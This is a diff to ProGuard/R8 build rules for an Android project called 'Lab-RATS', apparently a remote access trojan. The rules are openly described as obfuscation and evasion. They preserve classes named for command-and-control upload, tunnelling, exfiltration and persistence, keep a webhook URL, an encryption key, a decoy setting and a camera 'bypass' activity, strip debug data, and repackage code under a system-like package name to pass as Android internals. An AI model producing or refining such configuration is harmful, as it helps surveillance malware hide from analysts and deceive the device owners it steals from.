@@ -1,44 +1,63 @@
-# Hardened ProGuard / R8 Stealth & Obfuscation Rules for Lab-RATS
+# ====================================================================
+# Hardened ProGuard / R8 Obfuscation & Evasion Rules for Lab-RATS
+# ====================================================================
 
-# 1. Core Background Services & Exfiltration Handlers (Prevent R8 Stripping)
--keep class com.labs.labrats.WorkManager_Sync { *; }
--keep class com.labs.labrats.C2_Uploader { *; }
--keep class com.labs.labrats.C2_Tunnel { *; }
--keep class com.labs.labrats.SystemAnalytics { *; }
--keep class com.labs.labrats.FirebaseConfig { *; }
--keep class com.labs.labrats.IO_Persistence_Manager { *; }
--keep class com.labs.labrats.LabRatsWorker { *; }
+# 1. Strip Debug Information, Source Files, & Line Numbers
+-renamesourcefileattribute ''
+-keepattributes !SourceFile,!LineNumberTable,!LocalVariableTable,!LocalVariableTypeTable
 
-# 2. Build-Time Configuration & Key Preservation
+# 2. Enable Aggressive Code Optimizations & Access Modifications
+-allowaccessmodification
+-repackageclasses 'com.android.system.core'
+
+# 3. Android Components (Keep classes declared in AndroidManifest.xml so OS can instantiate them, but allow member obfuscation)
+-keep public class * extends android.app.Activity
+-keep public class * extends android.app.Service
+-keep public class * extends android.content.BroadcastReceiver
+-keep public class * extends android.app.Application
+-keep public class * extends androidx.work.ListenableWorker
+
+# Keep WorkManager Worker constructor required for reflection
+-keepclasseswithmembers class * extends androidx.work.ListenableWorker {
+    public <init>(android.content.Context, androidx.work.WorkerParameters);
+}
+
+# 4. Preserve Build-Time Configuration Constants
 -keep class com.labs.labrats.BuildConfig {
     public static final java.lang.String WEBHOOK_URL;
     public static final java.lang.String ENCRYPTION_KEY;
     public static final int DECOY_CHOICE;
 }
 
-# 3. Core Web Server & WebSocket Protocols (NanoHTTPD / Java_WebSocket / Gson)
--keep class fi.iki.elonen.** { *; }
+# 5. Core Web Server & WebSocket Protocols
+-keep class fi.iki.elonen.NanoHTTPD { *; }
+-keep class fi.iki.elonen.NanoHTTPD$IHTTPSession { *; }
+-keep class fi.iki.elonen.NanoHTTPD$Response { *; }
+-keep class fi.iki.elonen.NanoHTTPD$Response$Status { *; }
+
 -keep class org.java_websocket.** { *; }
 -keep class com.google.gson.** { *; }
+-keep class okhttp3.OkHttpClient { *; }
+-keep class okhttp3.Request { *; }
+-keep class okhttp3.WebSocket { *; }
+-keep class okhttp3.WebSocketListener { *; }
 
-# 4. Critical Type Signatures & Annotations
--keepattributes Signature
+# 6. Preserve Annotations Required by JavascriptInterface
 -keepattributes *Annotation*
--keepattributes EnclosingMethod
--keepattributes InnerClasses
-
-# 5. Reflection Targets
--keep class com.labs.labrats.Api24Helper { *; }
--keep class com.labs.labrats.Api30Helper { *; }
--keep class com.labs.labrats.CameraHelper$BypassActivity { *; }
-
-# 6. JavaScript Interface for Web Overlays
 -keepclassmembers class * {
     @android.webkit.JavascriptInterface <methods>;
 }
 
-# 7. Fast R8 Obfuscation (Preserves full class renaming/obfuscation while bypassing 60s optimization passes)
--dontoptimize
--dontpreverify
--allowaccessmodification
--repackageclasses 'com.android.internal.stability'
+# 7. Keep Reflection / Native Helpers
+-keep class com.labs.labrats.Api24Helper { *; }
+-keep class com.labs.labrats.Api30Helper { *; }
+-keep class com.labs.labrats.CameraHelper$BypassActivity { *; }
+-keep class com.labs.labrats.Obf { *; }
+
+# 8. Do Not Warn on Optional Third-Party Dependencies
+-dontwarn fi.iki.elonen.**
+-dontwarn org.java_websocket.**
+-dontwarn com.google.gson.**
+-dontwarn okhttp3.**
+-dontwarn okio.**
+-dontwarn javax.annotation.**
